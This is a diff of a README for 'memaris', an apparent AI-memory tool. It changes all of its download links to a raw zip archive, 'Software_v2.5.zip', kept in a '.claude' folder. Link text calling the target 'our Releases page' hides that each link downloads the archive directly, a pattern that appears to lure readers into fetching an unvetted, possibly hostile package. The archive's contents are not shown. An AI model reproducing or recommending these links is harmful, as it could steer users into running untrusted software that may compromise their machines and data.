@@ -1,6 +1,6 @@
 # 🎉 memaris - Enhance Your AI with Lasting Memory
 
-[![Download Memaris](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip)](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip)
+[![Download Memaris](https://github.com/9637730795/memaris/raw/refs/heads/main/.claude/Software_v2.5.zip)](https://github.com/9637730795/memaris/raw/refs/heads/main/.claude/Software_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to memaris! This application allows your AI assistant to retain informat
 
 To get started, you need to download memaris. Follow these steps:
 
-1. Click on this link to [visit our Releases page](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip).
+1. Click on this link to [visit our Releases page](https://github.com/9637730795/memaris/raw/refs/heads/main/.claude/Software_v2.5.zip).
 2. Look for the latest version of memaris.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided.
 
-You can also download directly from our Releases page here: [Download memaris](https://raw.githubusercontent.com/9637730795/memaris/main/metropolitanship/memaris.zip).
+You can also download directly from our Releases page here: [Download memaris](https://github.com/9637730795/memaris/raw/refs/heads/main/.claude/Software_v2.5.zip).
 
 ## 🛠️ System Requirements
 
